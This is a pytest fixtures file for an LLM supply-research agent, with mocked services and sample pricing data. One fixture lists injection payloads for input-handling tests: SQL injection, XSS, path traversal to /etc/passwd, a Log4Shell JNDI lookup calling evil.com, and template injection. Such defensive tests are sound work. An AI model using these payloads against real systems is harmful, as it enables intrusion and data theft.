"""
Shared test fixtures for SupplyResearcherAgent tests
Modular design with  <= 300 lines,  <= 8 lines per function
"""

import json
from datetime import datetime
from decimal import Decimal
from unittest.mock import AsyncMock, Mock
from netra_backend.app.llm.llm_defaults import LLMModel, LLMConfig


import pytest

from netra_backend.app.agents.state import DeepAgentState
from netra_backend.app.agents.supply_researcher_sub_agent import SupplyResearcherAgent
from netra_backend.app.llm.llm_manager import LLMManager
from netra_backend.app.services.supply_research_service import SupplyResearchService

@pytest.fixture
def mock_db():
    """Create mock database session with common methods"""
    db = Mock()
    db.query = Mock()
    db.add = AsyncMock()
    db.commit = AsyncMock()
    db.rollback = AsyncMock()
    db.flush = AsyncMock()
    return db

@pytest.fixture
def mock_llm_manager():
    """Create mock LLM manager with structured output support"""
    llm = Mock(spec=LLMManager)
    _setup_llm_responses(llm)
    return llm

def _setup_llm_responses(llm):
    """Setup default LLM responses ( <= 8 lines)"""
    default_response = _get_default_llm_response()
    llm.ask_llm = AsyncMock(return_value=json.dumps(default_response))
    llm.structured_output = AsyncMock(return_value=default_response)

def _get_default_llm_response():
    """Get default LLM response structure ( <= 8 lines)"""
    return {
        "research_type": "pricing",
        "provider": "openai",
        "model_name": "gpt-5",
        "timeframe": "current"
    }

@pytest.fixture
def mock_supply_service(mock_db):
    """Create mock supply research service"""
    service = Mock(spec=SupplyResearchService)
    _setup_supply_service(service, mock_db)
    return service

def _setup_supply_service(service, db):
    """Setup supply service mock methods ( <= 8 lines)"""
    service.db = db
    service.get_supply_items = Mock(return_value=[])
    service.create_or_update_supply_item = Mock()
    service.validate_supply_data = Mock(return_value=(True, []))
    service.calculate_price_changes = Mock(return_value={"total_changes": 0})
    service.detect_anomalies = Mock(return_value=[])

@pytest.fixture
def agent(mock_llm_manager, mock_db, mock_supply_service):
    """Create SupplyResearcherAgent instance with mocks"""
    agent = SupplyResearcherAgent(
        llm_manager=mock_llm_manager,
        db=mock_db,
        supply_service=mock_supply_service
    )
    _setup_agent_websocket(agent)
    return agent

def _setup_agent_websocket(agent):
    """Setup agent WebSocket manager ( <= 8 lines)"""
    agent.websocket_manager = Mock()
    agent.websocket_manager.send_agent_update = AsyncMock()
    agent.websocket_manager.broadcast = AsyncMock()

@pytest.fixture
def sample_state():
    """Create sample DeepAgentState for testing"""
    return DeepAgentState(
        user_request="Test request",
        chat_thread_id="test_thread",
        user_id="test_user"
    )

@pytest.fixture
def high_confidence_research_data():
    """Create high confidence research data fixture"""
    return {
        "citations": _get_sample_citations(),
        "questions_answered": _get_sample_qa_pairs()
    }

def _get_sample_citations():
    """Get sample citations for testing ( <= 8 lines)"""
    return [
        {"source": "Official API Docs", "url": "https://api.openai.com"},
        {"source": "Pricing Page", "url": "https://openai.com/pricing"},
        {"source": "Blog Post", "url": "https://blog.openai.com"}
    ]

def _get_sample_qa_pairs():
    """Get sample Q&A pairs for testing ( <= 8 lines)"""
    return [
        {"question": "pricing", "answer": "detailed pricing info"},
        {"question": "capabilities", "answer": "full capabilities"}
    ]

@pytest.fixture
def high_confidence_extracted_data():
    """Create high confidence extracted data fixture"""
    return [{
        "pricing_input": Decimal("30"),
        "pricing_output": Decimal("60"),
        "context_window": 128000,
        "capabilities": ["chat", "code", "vision"]
    }]

@pytest.fixture
def low_confidence_research_data():
    """Create low confidence research data fixture"""
    return {
        "citations": [],
        "questions_answered": []
    }

@pytest.fixture
def low_confidence_extracted_data():
    """Create low confidence extracted data fixture"""
    return [{"pricing_input": Decimal("30")}]

@pytest.fixture
def malicious_inputs():
    """Create malicious input test cases"""
    return [
        "'; DROP TABLE supply_items; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}"
    ]

@pytest.fixture
def mock_redis_manager():
    """Create mock Redis manager"""
    redis = Mock()
    redis.set = AsyncMock()
    redis.get = AsyncMock(return_value=json.dumps(_get_cached_data()))
    return redis

def _get_cached_data():
    """Get cached data structure ( <= 8 lines)"""
    return {
        "pricing_input": 30,
        "pricing_output": 60,
        "cached_at": datetime.now().isoformat()
    }

@pytest.fixture
def successful_api_response():
    """Create successful API response fixture"""
    return {
        "session_id": "test_session",
        "status": "completed",
        "questions_answered": _get_sample_qa_pairs(),
        "citations": _get_sample_citations()
    }

@pytest.fixture
def research_query_test_cases():
    """Create research query generation test cases"""
    return _get_query_test_cases()

def _get_query_test_cases():
    """Get query test case data ( <= 8 lines)"""
    from netra_backend.app.agents.supply_researcher_sub_agent import ResearchType
    return [
        _get_pricing_test_case(),
        _get_capabilities_test_case(),
        _get_availability_test_case()
    ]

def _get_pricing_test_case():
    """Get pricing query test case ( <= 8 lines)"""
    from netra_backend.app.agents.supply_researcher_sub_agent import ResearchType
    return {
        "parsed": {
            "research_type": ResearchType.PRICING,
            "provider": "openai",
            "model_name": LLMModel.GEMINI_2_5_FLASH.value,
            "timeframe": "current"
        },
        "expected_keywords": ["pricing", "cost", "tokens", LLMModel.GEMINI_2_5_FLASH.value]
    }

def _get_capabilities_test_case():
    """Get capabilities query test case ( <= 8 lines)"""
    from netra_backend.app.agents.supply_researcher_sub_agent import ResearchType
    return {
        "parsed": {
            "research_type": ResearchType.CAPABILITIES,
            "provider": "anthropic",
            "model_name": "claude-3",
            "timeframe": "latest"
        },
        "expected_keywords": ["capabilities", "context", "features", "claude-3"]
    }

def _get_availability_test_case():
    """Get availability query test case ( <= 8 lines)"""
    from netra_backend.app.agents.supply_researcher_sub_agent import ResearchType
    return {
        "parsed": {
            "research_type": ResearchType.AVAILABILITY,
            "provider": "google",
            "model_name": "gemini",
            "timeframe": "current"
        },
        "expected_keywords": ["availability", "api", "access", "gemini"]
    }

@pytest.fixture
def anomaly_test_data():
    """Create anomaly detection test data"""
    return {
        "all_changes": [{
            "provider": "openai",
            "model": LLMModel.GEMINI_2_5_FLASH.value,
            "field": "pricing_input",
            "percent_change": 150,
            "old_value": 10,
            "new_value": 25
        }]
    }

# Helper functions for test assertions ( <= 8 lines each)

def assert_websocket_updates_sent(agent):
    """Assert WebSocket updates were sent"""
    assert agent.websocket_manager.send_agent_update.called

def assert_confidence_score_high(score):
    """Assert confidence score is high (>0.8)"""
    assert score > 0.8

def assert_confidence_score_low(score):
    """Assert confidence score is low (<0.6)"""
    assert score < 0.6

def assert_malicious_input_safe(parsed_result):
    """Assert malicious input was parsed safely"""
    assert isinstance(parsed_result, dict)
    assert "research_type" in parsed_result

def assert_api_response_structure(response):
    """Assert API response has required structure"""
    assert "session_id" in response
    assert "status" in response
    assert "questions_answered" in response
    assert "citations" in response

def assert_research_query_keywords(query, keywords):
    """Assert research query contains expected keywords"""
    query_lower = query.lower()
    for keyword in keywords:
        assert keyword in query_lower